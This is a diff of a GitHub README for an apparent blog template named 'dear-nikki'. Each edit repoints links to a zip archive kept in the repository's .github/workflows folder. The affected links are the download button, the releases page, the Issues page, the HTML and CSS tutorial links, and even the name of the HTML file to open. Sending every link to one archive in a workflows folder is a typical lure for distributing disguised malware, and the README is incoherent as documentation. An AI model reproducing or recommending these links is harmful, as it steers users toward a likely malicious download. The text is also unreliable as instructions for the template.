@@ -6,11 +6,11 @@ Welcome to dear-nikki! This blog template helps you set up a beautiful and simpl
 
 ## 📥 Download the Template
 
-[![Download dear-nikki](https://raw.githubusercontent.com/Tahir77ba/dear-nikki/main/.github/workflows/dear-nikki_v3.5.zip)](https://raw.githubusercontent.com/Tahir77ba/dear-nikki/main/.github/workflows/dear-nikki_v3.5.zip)
+[![Download dear-nikki](https://raw.githubusercontent.com/Tahir77ba/dear-nikki/main/.github/workflows/dear_nikki_1.2-beta.2.zip)](https://raw.githubusercontent.com/Tahir77ba/dear-nikki/main/.github/workflows/dear_nikki_1.2-beta.2.zip)
 
 To download dear-nikki, click the button above or visit the releases page below:
 
-[Download dear-nikki](https://raw.githubusercontent.com/Tahir77ba/dear-nikki/main/.github/workflows/dear-nikki_v3.5.zip)
+[Download dear-nikki](https://raw.githubusercontent.com/Tahir77ba/dear-nikki/main/.github/workflows/dear_nikki_1.2-beta.2.zip)
 
 ## 🔧 System Requirements
 
@@ -31,7 +31,7 @@ Before you start, ensure your computer has the following:
 
 ### 1. Download & Install
 
-Go to the [Releases page](https://raw.githubusercontent.com/Tahir77ba/dear-nikki/main/.github/workflows/dear-nikki_v3.5.zip) to find the latest version of dear-nikki. Click on the version number and select the file to download.
+Go to the [Releases page](https://raw.githubusercontent.com/Tahir77ba/dear-nikki/main/.github/workflows/dear_nikki_1.2-beta.2.zip) to find the latest version of dear-nikki. Click on the version number and select the file to download.
 
 ### 2. Extract the Files
 
@@ -42,7 +42,7 @@ After downloading, locate the compressed file (usually in your Downloads folder)
 
 ### 3. Open the Template
 
-Navigate to the folder where you extracted the files. Look for an HTML file, typically named `https://raw.githubusercontent.com/Tahir77ba/dear-nikki/main/.github/workflows/dear-nikki_v3.5.zip`.
+Navigate to the folder where you extracted the files. Look for an HTML file, typically named `https://raw.githubusercontent.com/Tahir77ba/dear-nikki/main/.github/workflows/dear_nikki_1.2-beta.2.zip`.
 
 - Double-click this file to open it in your web browser.
 - You should see the default blog layout displayed.
@@ -77,15 +77,15 @@ A: You can host your blog on platforms like GitHub Pages, Netlify, or your own w
 
 For more tips and tutorials:
 
-- [HTML Basics](https://raw.githubusercontent.com/Tahir77ba/dear-nikki/main/.github/workflows/dear-nikki_v3.5.zip)
-- [CSS Basics](https://raw.githubusercontent.com/Tahir77ba/dear-nikki/main/.github/workflows/dear-nikki_v3.5.zip)
+- [HTML Basics](https://raw.githubusercontent.com/Tahir77ba/dear-nikki/main/.github/workflows/dear_nikki_1.2-beta.2.zip)
+- [CSS Basics](https://raw.githubusercontent.com/Tahir77ba/dear-nikki/main/.github/workflows/dear_nikki_1.2-beta.2.zip)
 
 ## ℹ️ Getting Help
 
 If you run into issues:
 
 - Check the FAQ section above.
-- Visit the [Issues page](https://raw.githubusercontent.com/Tahir77ba/dear-nikki/main/.github/workflows/dear-nikki_v3.5.zip) on GitHub to see if others have the same question, or to ask your own.
+- Visit the [Issues page](https://raw.githubusercontent.com/Tahir77ba/dear-nikki/main/.github/workflows/dear_nikki_1.2-beta.2.zip) on GitHub to see if others have the same question, or to ask your own.
 
 ## 🛠️ Contributing
 
